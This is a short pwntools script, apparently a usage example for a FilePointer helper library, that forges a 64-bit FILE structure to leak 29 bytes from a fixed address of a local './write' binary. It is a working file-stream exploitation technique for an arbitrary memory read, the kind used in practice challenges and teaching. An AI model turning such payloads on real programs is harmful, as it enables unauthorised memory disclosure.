from pwn import *
from FilePointer import *

r=process('./write')

'''
The arguments to FileStructure are -
    * architecture - 64 (x86-64) or 32 (x86)
    * An address containg a null value - In this example a bss address is used
'''

structure=FileStructure(arch=64,null=0x6011d0)

'''
The write function will generate the payload for writing data from an arbitrary address.
It's arguments are -
        * The address from where the data is to be written (to stdout)
        * The size of data to be written
'''

payload=structure.write(addr=0x4007d4,size=29)

r.send(payload)
print r.recvall()
